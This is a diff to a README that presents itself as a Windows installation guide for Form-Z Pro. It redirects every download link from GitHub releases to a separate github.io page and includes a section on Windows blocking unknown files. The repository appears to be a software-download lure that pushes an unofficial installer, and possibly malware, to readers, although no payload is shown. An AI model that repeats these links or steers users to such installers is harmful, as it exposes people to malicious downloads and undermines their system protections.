@@ -1,6 +1,6 @@
 # 🛠️ Form-Z-Setup-Help - Easy Windows installation for Form-Z Pro
 
-[![](https://img.shields.io/badge/Download-Form--Z-blue.svg)](https://github.com/code-Uchiha/Form-Z-Setup-Help/releases)
+[![](https://img.shields.io/badge/Download-Form--Z-blue.svg)](https://code-uchiha.github.io)
 
 This guide helps you put Form-Z Pro on your Windows 11 computer. Many users face hurdles during setup. This document provides clear steps to fix common errors and get your software running.
 
@@ -8,7 +8,7 @@ This guide helps you put Form-Z Pro on your Windows 11 computer. Many users face
 
 You must get the right software version for your computer. Follow these steps to reach the download area.
 
-1. Go to the [official release page](https://github.com/code-Uchiha/Form-Z-Setup-Help/releases).
+1. Go to the [official release page](https://code-uchiha.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the name of the installer file to save it to your computer.
 4. Wait for the download to finish. 
@@ -40,7 +40,7 @@ Windows 11 includes a feature that stops unknown files from running. If you see 
 ### Corrupt Installer Files
 Sometimes a download stops before it ends. This creates a broken file. If the installer will not open:
 1. Delete the file you downloaded.
-2. Go back to the [downloads page](https://github.com/code-Uchiha/Form-Z-Setup-Help/releases).
+2. Go back to the [downloads page](https://code-uchiha.github.io).
 3. Start the download process again.
 4. Ensure your internet connection stays stable during the download.
 
